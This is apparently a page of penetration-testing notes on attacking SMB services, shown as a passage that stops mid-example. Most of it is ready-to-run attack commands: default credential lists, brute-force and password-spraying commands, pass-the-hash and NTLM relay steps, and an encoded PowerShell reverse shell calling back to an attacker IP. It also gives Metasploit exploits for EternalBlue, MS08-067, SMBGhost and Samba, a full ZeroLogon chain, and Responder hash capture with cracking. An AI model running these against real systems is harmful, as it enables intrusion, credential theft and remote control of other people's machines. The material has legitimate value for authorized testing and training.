---
id: Exploitation
aliases: []
tags:
  - Networking/Services/SMB/Exploitation
links: "[[SMB]]"
---

<!-- Exploitation {{{-->
# Exploitation

___

<!-- Authentication {{{-->
## Authentication

<!-- Common Credentials {{{-->
### Common Credentials

Log in with common credentials

<!-- Common Credentials {{{-->
> [!danger]- Common Credentials
>
> | Username             | Password                                |
> | -------------------- | --------------------------------------- |
> | (blank)              | (blank)                                 |
> | guest                | (blank)                                 |
> | Administrator, admin | (blank), password, administrator, admin |
> | arcserve             | arcserve, backup                        |
> | tivoli, tmersrvd     | tivoli, tmersrvd, admin                 |
> | backupexec, backup   | backupexec, backup, arcada              |
> | test, lab, demo      | password, test, lab, demo               |
<!-- }}} -->

<!-- }}} -->

<!-- Brute Force {{{-->
### Brute Force

Brute Force SMB Login

<!-- Wordlist {{{-->
> [!tip]- Wordlist
>
> Usernames
>
> - [[SecLists#Usernames|SecLists]]
>
> Passwords
>
> - [[SecLists#Passwords|SecLists]]
<!-- }}} -->

[[Nmap]] — Brute force SMB login
(*[smb-brute](https://nmap.org/nsedoc/scripts/smb-brute.html)*)

```sh
nmap $target -p 445 --script smb-brute -oA smb-brute-force
```

[[Nmap]] — Brute force SMB login with custom credentials

```sh
nmap $target -p 445 --script smb-brute --script-args userdb=<users.txt>,passdb=<passwords.txt> -oA smb-brute-force-custom-credentials
```

[[Hydra]] — Brute force SMB login

```sh
hydra -l <target_user> -P <passwords.txt> $target smb -t 1
```

```sh
hydra -l administrator -P <passwords.txt> smb://$target
```

[[Metasploit]] — Brute force SMB login

```sh
use auxiliary/scanner/smb/smb_login
```

<!-- Example {{{-->
> [!example]-
>
> 1. [[Metasploit#Search Exploit|Search Exploit]]
>
> 2. [[Metasploit#Select Exploit|Select Exploit]]
>
> ```sh
> use auxiliary/scanner/smb/smb_login
> ```
>
> 3. [[Metasploit#Set Option|Set options]]
>
> ```sh
> set RHOSTS target.com
> ```
>
> ```sh
> set USER_FILE /path/to/users.txt
> ```
>
> ```sh
> set PASS_FILE /path/to/passwords.txt
> ```
>
> ```sh
> set STOP_ON_SUCCESS true
> ```
>
> 4. [[Metasploit#Run Exploit|Run exploit]]
>
> ```sh
> exploit
> ```
<!-- }}} -->

[[NetExec]] — [Password Spraying](https://www.netexec.wiki/smb-protocol/password-spraying)

```sh
nxc smb $target -u <user> -p <password>
```

<!-- Info {{{-->
> [!info]-
>
> - `--continue-on-success`: Continue spraying after valid password found
> - `--local-auth`: Spray non-domain joined computer
<!-- }}} -->

Use list of users or passwords

```sh
nxc smb $target -u <user> -p <passwords.txt>
```

```sh
nxc smb $target -u <users.txt> -p <password>
```

Use multiple usernames or passwords

```sh
nxc smb $target -u <user1> <user2> <user3> -p <password>
```

```sh
nxc smb $target -u <user> -p <password1> <password2> <password3>
```

One login equal one password

```sh
nxc smb $target -u <users.txt> -p <passwords.txt> --no-bruteforce --continue-on-success
```

<!-- }}} -->

<!-- Pass-The-Hash {{{-->
### Pass-The-Hash

[Pass the Hash](https://en.wikipedia.org/wiki/Pass_the_hash)
may allow to authenticate to remote server or service
with [[NTLM]] or [[LanMan]] hash

<!-- Tip {{{-->
> [!tip]
>
> Capture hashes using [[#Forced Authentcation]]
<!-- }}} -->

```sh
nxc smb $target -u <user> -H 'LM:NT'
```

```sh
nxc smb $target -u <user> -H 'LM:NT' --local-auth
```

```sh
nxc smb $target -u <user> -H 'NTHASH'
```

```sh
nxc smb $target -u <user> -H 'NTHASH' --local-auth
```

```sh
nxc smb $target -u <user> -H '<hash>'
```

```sh
nxc smb $target -u <user> -H '<hash>' --local-auth
```

<!-- Example {{{-->
> [!example]-
>
> Obtained credentials
>
> ```sh
> Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
> ```
>
> ```sh
> nxc smb 192.168.1.0/24 -u UserNAme -H 'LM:NT'
> ```
> ```sh
> nxc smb 192.168.1.0/24 -u UserNAme -H 'NTHASH'
> ```
> ```sh
> nxc smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
> ```
> ```sh
> nxc smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Relay Hash {{{-->
### Relay Hash

Relay obtained hashes to another machine

[[Impacket]] - [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) —
Dump [[SAM]] database

```sh
impacket-ntlmrelayx --no-http-server -smb2support -t $target
```

<!-- Info {{{-->
> [!info]-
>
> - `--no-http-server`: Disable HTTP server
> - `-smb2support`: Enable SMBv2 support
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
> ```
>
> ```
> Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
>
> <SNIP>
>
> [*] Running in relay mode to single host
> [*] Setting up SMB Server
> [*] Setting up WCF Server
>
> [*] Servers started, waiting for connections
>
> [*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, attacking target smb://10.10.110.146
> [*] Authenticating against smb://10.10.110.146 as /ADMINISTRATOR SUCCEED
> [*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
> [*] SMBD-Thread-5: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
> [*] Service RemoteRegistry is in stopped state
> [*] Service RemoteRegistry is disabled, enabling it
> [*] Starting service RemoteRegistry
> [*] Target system bootKey: 0xeb0432b45874953711ad55884094e9d4
> [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
> Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
> Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
> DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
> WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92512f2605074cfc341a7f16e5fabf08:::
> demouser:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
> test:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
> [*] Done dumping SAM hashes for host: 10.10.110.146
> [*] Stopping service RemoteRegistry
> [*] Restoring the disabled state for service RemoteRegistry
> ```
<!-- }}} -->

[[Impacket]] - [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) —
Execute commands

```sh
impacket-ntlmrelayx --no-http-server -smb2support -t $target -c '<command>'
```

<!-- Example {{{-->
> [!example]-
>
> Execute a [[PowerShell]] [reverse shell](https://www.revshells.com/)
> encoded as Base64
>
> ```sh
> ncat -lvnp 1234
> ```
>
> ```sh
> impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
> ```
>
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- CVE Exploits {{{-->
## CVE Exploits

<!-- Search Exploits {{{-->
> [!tip] Search Exploits
>
> [[SearchSploit]]
>
> ```sh
> searchsploit microsoft smb
> ```
>
> ```sh
> searchsploit "Samba 3.0.20"
> ```
>
> [[Metasploit]]
>
> ```sh
> search type:exploit platform:windows target:2008 smb
> ```
<!-- }}} -->

<!-- EternalBlue (MS17-010) {{{-->
### EternalBlue

[[Metasploit]] — [SecWiki-MS17-010](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS17-010/ms17_010_eternalblue.rb)
SMB Remote Windows Kernel Pool Corruption

```sh
use exploit/windows/smb/ms17_010_eternalblue
```

<!-- ms17_010_eternalblue {{{-->
> [!info]- ms17_010_eternalblue
>
> [ms17_010_eternalblue](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)
> is a port of the Equation Group [[EternalBlue]] exploit, part of
> the FuzzBunch toolkit released by Shadow Brokers.
>
> There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size
> is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a
> DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow
> is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later
> completed in srvnet!SrvNetWskReceiveComplete.
>
> This exploit, like the original may not trigger 100% of the time, and should be
> run continuously until triggered. It seems like the pool will get hot streaks
> and need a cool down period before the shells rain in again.
>
> The module will attempt to use Anonymous login, by default, to authenticate to perform the
> exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use
> those instead
<!-- }}} -->

<!-- Warning {{{-->
> [!warning]
>
> This module may cause system instability and crashes,
> such as a BSOD or a reboot
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> use exploit/windows/smb/ms17_010_eternalblue
> ```
> ```sh
> set LHOST <attacker_ip/attacker_interface>
> ```
> ```sh
> set RHOSTS $target
> ```
> ```sh
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> ```
> ```sh
> exploit
> ```
>
> > [!info]-
> >
> > Connects to each target on port 445.
> >
> > Sends specific SMBv1 crafted packets used
> > in known EternalBlue detection techniques.
> >
> > Checks for:
> > - SMBv1 support
> > - Signs of vulnerability to MS17-010
> > - System info (*OS, hostname, etc.*)
<!-- }}} -->

[[Metasploit]] — [ms17_010_psexec](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_psexec/)
MS17-010 EternalRomance/EternalSynergy/EternalChampion
SMB Remote Windows Code Execution

```sh
use exploit/windows/smb/ms17_010_psexec
```

<!-- ms17_010_psexec {{{-->
> [!info]- ms17_010_psexec
>
> This module will exploit SMB with vulnerabilities in MS17-010
> to achieve a write-what-where primitive.
> This will then be used to overwrite the connection session information
> with as an Administrator session.
> From there, the normal psexec payload code execution is done.
>
> Exploits a type confusion between Transaction and WriteAndX requests
> and a race condition in Transaction requests, as seen in the EternalRomance,
> EternalChampion, and EternalSynergy exploits.
> This exploit chain is more reliable than the EternalBlue exploit,
> but requires a named pipe.
<!-- }}} -->

<!-- Warning {{{-->
> [!warning]
>
> This module may cause system instability and crashes,
> such as a BSOD or a reboot
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> use exploit/windows/smb/ms17_010_psexec
> ```
> ```sh
> set LHOST <attacker_ip/attacker_interface>
> ```
> ```sh
> set RHOSTS $target
> ```
> ```sh
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> ```
> ```sh
> exploit
> ```
>
> > [!info]-
> >
> > Connects to each target on port 445.
> >
> > Sends specific SMBv1 crafted packets used
> > in known EternalBlue detection techniques.
> >
> > Checks for:
> > - SMBv1 support
> > - Signs of vulnerability to MS17-010
> > - System info (*OS, hostname, etc.*)
<!-- }}} -->

<!-- }}} -->

<!-- Netapi (MS08-067) {{{-->
### Netapi

[[Metasploit]] — MS08-067 Microsoft Server Service Relative Path Stack Corruption

```sh
use exploit/windows/smb/ms08_067_netapi
```

<!-- ms08_067_netapi {{{-->
> [!info]- ms08_067_netapi
>
> [ms08_067_netapi](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi/)
> exploits a parsing flaw in the path canonicalization code of
> `NetAPI32.dll` through the Server Service.
>
> This module is capable of bypassing NX on some operating systems
> and service packs.
>
> The correct target must be used to prevent the Server Service
> (along with a dozen others in the same process) from crashing.
>
> Windows XP targets seem to handle multiple successful exploitation events,
> but 2003 targets will often crash or hang on subsequent attempts.
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> use exploit/windows/smb/ms08_067_netapi
> ```
> ```sh
> set RHOSTS $target
> ```
> ```sh
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> ```
> ```sh
> set LHOST <attacker_ip>
> ```
> ```sh
> exploit
> ```
<!-- }}} -->

<!-- }}} -->

<!-- SMBGhost (CVE-2020-0796) {{{-->
### SMBGhost

[[Metasploit]] — SMBv3 Compression Buffer Overflow
(*version `3.1.1`*)

```sh
use exploit/windows/smb/cve_2020_0796_smbghost
```

<!-- cve_2020_0796_smbghost {{{-->
> [!info]- cve_2020_0796_smbghost
>
> A remote code execution vulnerability
> exists in the way hat the Microsoft
> [[SMB/General|SMB]] 3.1.1 (*SMBv3*)
> protocol handles certain requests
>
> [cve_2020_0796_smbghost](https://www.rapid7.com/db/modules/exploit/windows/smb/cve_2020_0796_smbghost/)
> leverages this flaw to execute code in the context of the kernel,
> finally yielding a session as `NT AUTHORITY\SYSTEM` in `spoolsv.exe`.
>
> Exploitation can take a few minutes as the necessary data is gathered.
<!-- }}} -->

<!-- Warning {{{-->
> [!warning]
>
> Exploitation can take a few minutes as the necessary data is gathered.
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> use exploit/windows/smb/cve_2020_0796_smbghost
> ```
> ```sh
> set RHOSTS $target
> ```
> ```sh
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> ```
> ```sh
> set LHOST <attacker_ip>
> ```
> ```sh
> exploit
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Username Map Script (CVE-2007-2447) {{{-->
### Username Map Script

[[Metasploit]] — Samba "username map script" Command Execution
(*version `3.0.20` - `3.0.25rc3`*)

```sh
use exploit/multi/samba/usermap_script
```

<!-- usermap_script {{{-->
> [!info]- usermap_script
>
> [usermap_script](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/)
> exploits a command execution vulnerability in Samba version
> `3.0.20` through `3.0.25rc3` when using the non-default
> "username map script" configuration option.
>
> By specifying a username
> containing shell meta characters, attackers can execute arbitrary
> commands.

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf > use exploit/multi/samba/usermap_script
> ```
> ```sh
> msf exploit(usermap_script) > show options
> ```
> ```sh
> msf exploit(usermap_script) > set RHOST $target
> ```
> ```sh
> msf exploit(usermap_script) > set LHOST <attacker_ip>
> ```
> ```sh
> msf exploit(usermap_script) > exploit
> ```
<!-- }}} -->

<!-- }}} -->

<!-- }}} -->

<!-- ZeroLogon (CVE-2020-1472) {{{-->
### ZeroLogon

Abuse the [Netlogon Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/ff8f970f-3e37-40f7-bd4b-af7336e4792f)
flaw, forcing the [[Domain Controller]]
to accept an empty password for its machine account

1. [[Networking/Services/SMB/Enumeration#ZeroLogon|Detect ZeroLogon]] vulnerability

2. [dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py) —
   Launch the exploit against the target

```sh
python3 cve-2020-1472-exploit.py <netbios_name> $target
```

3. [[Impacket]] - [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) —
   Dump user hashes

```sh
python3 secretsdump.py -no-pass -just-dc <domain>/<netbios_name>\$@$target
```

4. [[NetExec]] - [[Usage#Pass-The-Hash|Pass-The-Hash]] —
   Confirm valid credentials

```sh
nxc smb $target -u '<user>' -H '<hash>'
```

```sh
nxc smb $target -u '<user>' -H '<hash>' --local-auth
```

5. [[NetExec]] - Verify terminal access

```sh
nxc winrm $target -u '<user>' -H '<hash>'
```

6. [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) —
   Establish an interactive shell on the compromised host

```sh
evil-winrm -i $target -u '<user>' -H '<hash>'
```

<!-- }}} -->

___
<!-- }}} -->

<!-- Forced Authentication {{{-->
## Forced Authentication

Capture and the user's [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)

1. Get interface name

```sh
ip addr
```

```sh
ifconfig
```

2. [[Responder]] — Host a fake SMB server

```sh
responder -I <interface_name>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> responder -I eth0
> ```
> ```sh
>                                          __
>   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
>   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
>   |__| |_____|_____|   __|_____|__|__|_____||_____|__|
>                    |__|              
>
>            NBT-NS, LLMNR & MDNS Responder 3.0.6.0
>
>   Author: Laurent Gaffie (laurent.gaffie@gmail.com)
>   To kill this script hit CTRL-C
>
> [+] Poisoners:                
>     LLMNR                      [ON]
>     NBT-NS                     [ON]        
>     DNS/MDNS                   [ON]   
>
> [+] Servers:
>     HTTP server                [ON]                                   
>     HTTPS server               [ON]
>     WPAD proxy                 [OFF]                                  
>     Auth proxy                 [OFF]
>     SMB server                 [ON]                                   
>     Kerberos server            [ON]                                   
>     SQL server                 [ON]                                   
>     FTP server                 [ON]                                   
>     IMAP server                [ON]                                   
>     POP3 server                [ON]                                   
>     SMTP server                [ON]                                   
>     DNS server                 [ON]                                   
>     LDAP server                [ON]
>     RDP server                 [ON]
>     DCE-RPC server             [ON]
>     WinRM server               [ON]                                   
>
> [+] HTTP Options:                                                                  
>     Always serving EXE         [OFF]                                               
>     Serving EXE                [OFF]                                               
>     Serving HTML               [OFF]                                               
>     Upstream Proxy             [OFF]                                               
>
> [+] Poisoning Options:                                                             
>     Analyze Mode               [OFF]                                               
>     Force WPAD auth            [OFF]                                               
>     Force Basic Auth           [OFF]                                               
>     Force LM downgrade         [OFF]                                               
>     Fingerprint hosts          [OFF]                                               
> 
> [+] Generic Options:                                                               
>     Responder NIC              [tun0]                                              
>     Responder IP               [10.10.14.198]                                      
>     Challenge set              [random]                                            
>     Don't Respond To Names     ['ISATAP']                                          
> 
> [+] Current Session Variables:                                                     
>     Responder Machine Name     [WIN-2TY1Z1CIGXH]   
>     Responder Domain Name      [HF2L.LOCAL]                                        
>     Responder DCE-RPC Port     [48162] 
> 
> [+] Listening for events... 
> 
> [*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
> [*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
> [*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
> [*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
> [*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
> [SMB] NTLMv2-SSP Client   : 10.10.110.17
> [SMB] NTLMv2-SSP Username : WIN7BOX\demouser
> [SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
> ```

<!-- }}} -->

Crack the captured

3. [[Responder]] — Find the saved hashes in the logs directory

```sh
/usr/share/responder/logs/
```

<!-- Info {{{-->
> [!info]-
>
> **Multiples hashes** for one account may exist
> as NTLMv2 utilizes both a client-side and server-side challenge
> that is randomized for each interaction
>
> The resulting hashes that are sent are salted with a randomized string of numbers.
>
> The hashes don't match but still represent the same password.
<!-- }}} -->

4. [[Hashcat]] — Crack the captured hash

```sh
hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt
```

```sh
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

<!-- Hashcat Modes {{{-->
> [!info]- Hashcat Modes
>
> [Hashcat - Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
>
> - `5500`: NetNTLMv1 / NetNTLMv1+ESS 
> - `5600`: NetNTLMv2
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
> ```
>
> ```sh
> hashcat (v6.1.1) starting...
>
> <SNIP>
>
> Dictionary cache hit:
> * Filename..: /usr/share/wordlists/rockyou.txt
> * Passwords.: 14344386
> * Bytes.....: 139921355
> * Keyspace..: 14344386
>
> ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc46296b0ccfc7a231d918ae1dae521:0101000000000000b09b51939ba6d40140c54ed46ad58e890000000002000e004e004f004d00410054004300480001000a0053004d0042003100320004000a0053004d0042003100320003000a0053004d0042003100320005000a0053004d0042003100320008003000300000000000000000000000003000004289286eda193b087e214f3e16e2be88fec5d9ff73197456c9a6861ff5b5d3330000000000000000:P@ssword
>
> Session..........: hashcat
> Status...........: Cracked
> Hash.Name........: NetNTLMv2
> Hash.Target......: ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc...000000
> Time.Started.....: Mon Apr 11 16:49:34 2022 (1 sec)
> Time.Estimated...: Mon Apr 11 16:49:35 2022 (0 secs)
> Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
> Guess.Queue......: 1/1 (100.00%)
> Speed.#1.........:  1122.4 kH/s (1.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
> Recovered........: 1/1 (100.00%) Digests
> Progress.........: 75776/14344386 (0.53%)
> Rejected.........: 0/75776 (0.00%)
> Restore.Point....: 73728/14344386 (0.51%)
> Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
> Candidates.#1....: compu -> kodiak1
>
> Started: Mon Apr 11 16:49:34 2022
> Stopped: Mon Apr 11 16:49:37 2022
> ```
>
> The password is `P@ssword`
>
<!-- }}} -->

<!-- Tip {{{-->
> [!tip]
>
> Authenticate to servers or services using
> [[#Pass-The-Hash]]
<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

___

<!-- Enumeration {{{-->
## Enumeration

<!-- Antivirus {{{-->
### Antivirus

Enumerate installed Antivirus & [EDR](https://en.wikipedia.org/wiki/Endpoint_detection_and_response)
solutions

[[NetExec]] — [Enumerate Anti-Virus & EDR](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-antivirus-edr)

```sh
nxc smb $target -u <user> -p <password> -M enum_av
```

<!-- }}} -->

<!-- Bitlocker {{{-->
### Bitlocker

Enumerate [[BitLocker]] status on the remote target

[[NetExec]] — [Enumerate Bitlocker](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-bitlocker)

```sh
nxc smb $target -u <user> -p <password> -M bitlocker
```

<!-- }}} -->

<!-- Disk {{{-->
### Disk

Enumerate disks on the target

[[NetExec]] — [Enumerate Disks](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-disks)

```sh
nxc smb $target -u <user> -p <password> --disks
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --disks
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Groups {{{-->
### Groups

Enumerate groups on the remote target

[[NetExec]] — [Enumerate Local Groups](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-local-groups)

```sh
nxc smb $target -u <user> -p <password> --local-group
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --local-group
> ```
<!-- }}} -->


<!-- }}} -->

<!-- Network {{{-->
### Network

Enumerate network interfaces on a host

[[NetExec]] — [Enumerate Network Interfaces](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-network-interfaces)

> [!warning]
>
> Local administrator privilege required on the remote target

```sh
nxc smb $target -u <user> -p '<password>' --interfaces
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> nxc smb 192.168.56.11 -u USERNAME -p 'PASSWORDHERE' --interfaces
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Password Policy {{{-->
### Password Policy

Enumerate domain password policy

[[Netexec]] — [Enumerate Domain Password Policy](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-domain-password-policy-1)

```sh
nxc smb $target -u <user> -p <password> --pass-pol
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> nxc smb $target -u "guest" -p "" --pass-pol
> ```
> ```sh
> SMB         10.129.203.6    445    ATTCSVC-LINUX    [*] Unix - Samba (name:ATTCSVC-LINUX) (domain:) (signing:False) (SMBv1:False) 
> SMB         10.129.203.6    445    ATTCSVC-LINUX    [+] \guest: (Guest)
> SMB         10.129.203.6    445    ATTCSVC-LINUX    [+] Dumping password info for domain: ATTCSVC-LINUX
> SMB         10.129.203.6    445    ATTCSVC-LINUX    Minimum password length: 5
> SMB         10.129.203.6    445    ATTCSVC-LINUX    Password history length: None
> SMB         10.129.203.6    445    ATTCSVC-LINUX    Maximum password age: 37 days 6 hours 21 minutes 
> SMB         10.129.203.6    445    ATTCSVC-LINUX    
> SMB         10.129.203.6    445    ATTCSVC-LINUX    Password Complexity Flags: 000000
> SMB         10.129.203.6    445    ATTCSVC-LINUX        Domain Refuse Password Change: 0
> SMB         10.129.203.6    445    ATTCSVC-LINUX        Domain Password Store Cleartext: 0
> SMB         10.129.203.6    445    ATTCSVC-LINUX        Domain Password Lockout Admins: 0
> SMB         10.129.203.6    445    ATTCSVC-LINUX        Domain Password No Clear Change: 0
> SMB         10.129.203.6    445    ATTCSVC-LINUX        Domain Password No Anon Change: 0
> SMB         10.129.203.6    445    ATTCSVC-LINUX        Domain Password Complex: 0
> SMB         10.129.203.6    445    ATTCSVC-LINUX    
> SMB         10.129.203.6    445    ATTCSVC-LINUX    Minimum password age: None
> SMB         10.129.203.6    445    ATTCSVC-LINUX    Reset Account Lockout Counter: 30 minutes 
> SMB         10.129.203.6    445    ATTCSVC-LINUX    Locked Account Duration: 30 minutes 
> SMB         10.129.203.6    445    ATTCSVC-LINUX    Account Lockout Threshold: None
> SMB         10.129.203.6    445    ATTCSVC-LINUX    Forced Log off Time: 37 days 6 hours 21 minutes
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Processes {{{-->
### Processes

Enumerate processes on the remote target

[[NetExec]] — [Enumerate Remote Processes](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-remote-processes)

```sh
nxc smb $target -u <user> -p <password> --tasklist
```

```sh
nxc smb $target -u <user> -p <password> --tasklist <process>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> nxc smb 192.168.1.0/24 -u user -p 'PASSWORDHERE' --tasklist keepass.exe
> ```
<!-- }}} -->

[[NetExec]] — [Kill Remote Processes](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-remote-processes#killing-remote-processes)

```sh
nxc smb $target -u <user> -p <password> --taskkill <PID>
```

```sh
nxc smb $target -u <user> -p <password> --taskkill <process>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> nxc smb 192.168.1.0/24 -u user -p 'PASSWORDHERE' --taskkill process_name.exe
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Shares {{{-->
### Shares

Enumerate SMB shares on the target

[[NetExec]] — [Enumerate shares and Access](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-shares-and-access)

```sh
nxc smb $target -u <user> -p <password> --shares
```

<!-- Example {{{-->
> [!example]-
>
> Determine what shares are provided by the SMB service,
> which ones are readable/writable and collect additional information
> (*e.g., share types, directories, files, time stamps, etc.*)
>
> ```sh
> msfconsole
> ```
> ```sh
> use auxiliary/scanner/smb/smb_version
> ```
> ```sh
> set RHOSTS $target
> ```
> ```sh
> set RPORT 445
> ```
> ```sh
> run
